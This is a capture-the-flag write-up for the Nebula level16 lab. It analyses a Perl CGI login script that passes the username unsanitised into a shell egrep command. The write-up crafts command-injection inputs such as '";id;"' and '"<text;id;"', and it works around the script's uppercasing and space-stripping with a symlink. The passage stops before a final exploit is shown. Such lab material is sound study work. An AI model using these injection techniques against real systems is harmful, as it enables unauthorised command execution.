## Challenge
There is a perl script running on port 1616.

## Solution
```perl
#!/usr/bin/env perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space

  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
  foreach $line (@output) {
      ($usr, $pw) = split(/:/, $line);
  

      if($pw =~ $password) {
          return 1;
      }
  }

  return 0;
}

sub htmlz {
  print("<html><head><title>Login resuls</title></head><body>");
  if($_[0] == 1) {
      print("Your login was accepted<br/>");
  } else {
      print("Your login failed<br/>");
  }    
  print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));
```
Running on port 1616 you say?
```console
level16@nebula:~$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 localhost:50001         *:*                     LISTEN
tcp        0      0 *:ssh                   *:*                     LISTEN
tcp        0      0 *:10007                 *:*                     LISTEN
tcp        0      0 localhost:6010          *:*                     LISTEN
tcp6       0      0 [::]:1616               [::]:*                  LISTEN
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN
tcp6       0      0 ip6-localhost:6010      [::]:*                  LISTEN
tcp6       0      0 [::]:afs3-bos           [::]:*                  LISTEN
udp        0      0 *:bootpc                *:*
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     7840     @/com/ubuntu/upstart
unix  2      [ ACC ]     STREAM     LISTENING     8253     /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     SEQPACKET  LISTENING     8187     @/org/kernel/udev/udevd
unix  2      [ ACC ]     STREAM     LISTENING     11160    /tmp//tmux-1017/default
```
Alright, let's try to access it.
```console
level16@nebula:~$ nc -v 127.0.0.1 1616
Connection to 127.0.0.1 1616 port [tcp/*] succeeded!

UNKNOWN 400 Bad Request
Server: thttpd/2.25b 29dec2003
Content-Type: text/html; charset=iso-8859-1
Date: Fri, 06 Aug 2021 10:55:30 GMT
Last-Modified: Fri, 06 Aug 2021 10:55:30 GMT
Accept-Ranges: bytes
Connection: close
Cache-Control: no-cache,no-store

<HTML>
<HEAD><TITLE>400 Bad Request</TITLE></HEAD>
<BODY BGCOLOR="#cc9999" TEXT="#000000" LINK="#2020ff" VLINK="#4040cc">
<H2>400 Bad Request</H2>
Your request has bad syntax or is inherently impossible to satisfy.
<HR>
<ADDRESS><A HREF="http://www.acme.com/software/thttpd/">thttpd/2.25b 29dec2003</A></ADDRESS>
</BODY>
</HTML>
```
An HTTP server, so the Perl script serves as a `CGI` (`common gateway interface`), which is a fancy name for a web server endpoint that runs code on the server machine and returns the result to the server's client, as opposed to static HTML page for example.
```console
level16@nebula:/home/flag16$ ls -la
total 10
drwxr-x--- 2 flag16 level16  120 2011-11-20 21:46 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag16 flag16   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag16 flag16  3353 2011-05-18 02:54 .bashrc
-rwxr-xr-x 1 root   root     730 2011-11-20 21:46 index.cgi
-rw-r--r-- 1 flag16 flag16   675 2011-05-18 02:54 .profile
-rw-r--r-- 1 root   root    3719 2011-11-20 21:46 thttpd.conf
-rw-r--r-- 1 root   root       0 2011-11-20 21:46 userdb.txt
```
```console
level16@nebula:/home/flag16$ less thttpd.conf
```
The configuration file is stuffed with explanations, I'll boil it down to the relevant settings.
```
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=1616

...

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag16

...

# Specifies what user to switch to after initialization when started as root.
user=flag16

# Specifies a wildcard pattern for CGI programs, for instance "**.cgi" or
# "/cgi-bin/*". See thttpd(8) for details.
cgipat=**.cgi

...
```
So we have a webserver running as `flag16` from `/home/flag16` that executes `CGI`s with a `.cgi` file extension.

We also have `index.cgi` that is the Perl script bundled with the challenge and an empty file named `userdb.txt`.

Let's try to execute the `CGI`.
```console
level16@nebula:~$ wget -O - http://127.0.0.1:1616/index.cgi
--2021-08-06 05:10:04--  http://127.0.0.1:1616/index.cgi
Connecting to 127.0.0.1:1616... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: `STDOUT'

    [<=>                                                                                                                                                         ] 0           --.-K/s              <html><head><title>Login resuls</title></head><body>Your login failed<br/>Would you like a cookie?<br/><br/></body></html>
    [ <=>                                                                                                                                                        ] 123         --.-K/s   in 0.003s

2021-08-06 05:10:04 (44.0 KB/s) - written to stdout [123]

```

Seems to work, let's go back and review the code:
* It defines two functions, `login()` and `htmlz()`
```perl
sub login {
  ...
}

sub htmlz {
  ...
}
```
* And then calls `login()` with query parameters `username` and `password`, and passes the result to `htmlz()`
```perl
htmlz(login(param("username"), param("password")));
```
* `login()` assigns the parameters to respective variables `$username` and `$password`
*  Converts `$username` to uppercase and strips text leading the first space (` `)
*  Runs the formatted string `egrep "^$username" /home/flag16/userdb.txt 2>&1`
   *  **This seems like the place for us to intercept, classic `command-injection`?**
> in Perl, a string between backticks (`) runs as a shell command and returns the value written to STDOUT
```perl
sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space

  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
  foreach $line (@output) {
      ($usr, $pw) = split(/:/, $line);
  

      if($pw =~ $password) {
          return 1;
      }
  }

  return 0;
}
```
* `htmlz()` wraps `login()`'s output to HTML
```perl
sub htmlz {
  print("<html><head><title>Login resuls</title></head><body>");
  if($_[0] == 1) {
      print("Your login was accepted<br/>");
  } else {
      print("Your login failed<br/>");
  }    
  print("Would you like a cookie?<br/><br/></body></html>\n");
}
```
### Command Injection
To practice `command-injection` in `login()` I created a little playground script.
```perl
# take username string from STDIN
$username = <>;

$username =~ tr/a-z/A-Z/; # conver to uppercase
$username =~ s/\s.*//;        # strip everything after a space

# show how commandline will look like
$test = "egrep \"^$username\" /home/flag16/userdb.txt 2>&1";
print $test . "\n";

# run commandline
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
print @output;
```
We can then run it and try injecting a command.

Let's try running `id`.
```console
level16@nebula:~$ perl test.pl
";id;""
egrep "^";ID;""" /home/flag16/userdb.txt 2>&1
sh: -c: line 0: unexpected EOF while looking for matching `"'
sh: -c: line 1: syntax error: unexpected end of file
```
I mistakenly put one extra quotation mark.

Note we can't use spaces, as text after them will be stripped.
```console
level16@nebula:~$ perl test.pl
";id;"
egrep "^";ID;"" /home/flag16/userdb.txt 2>&1

hello
world
^C
```
This time it repeatingly asks for more user input.

I guess it has to do with not supplying an input file to `egrep` and thus it asks for STDIN input.
```console
level16@nebula:~$ egrep "^"
hello
hello
world
world
^C
```
Yes, `egrep` acts as expected, it defers in echo'ing the input to STDOUT, this is because perl would have printed to STDOUT but I intercepted the shell by pressing `CTRL + C` and the process died before reaching the printing part of the program.

Let's try to feed `egrep` an input file using the redirection symbol (`<`).
```console
level16@nebula:~$ echo "hello world" > text
level16@nebula:~$ egrep "hello"<text
hello world
```
We can reproduce this in our injection, because we don't need a space here.
```console
level16@nebula:~$ perl test.pl
"<text;id;"
egrep "^"<TEXT;ID;"" /home/flag16/userdb.txt 2>&1
sh: TEXT: No such file or directory
sh: ID: command not found
sh: : command not found
```
Okay, we managed to escape the first command and execute `ID`, but because of the upper-case we didn't achieve execution of `id`. The same happened with the file `text`.

We can create a `symlink` for `id` named `ID` to fix this issue.
```console
level16@nebula:~$ whereis id
id: /usr/bin/id /usr/share/man/man1/id.1.gz
level16@nebula:~$ ln -s -T /usr/bin/id ID
level16@nebula:~$ ls -la | grep ID
lrwxrwxrwx 1 level16 level16   11 2021-08-06 05:40 ID -> /usr/bin/id
```
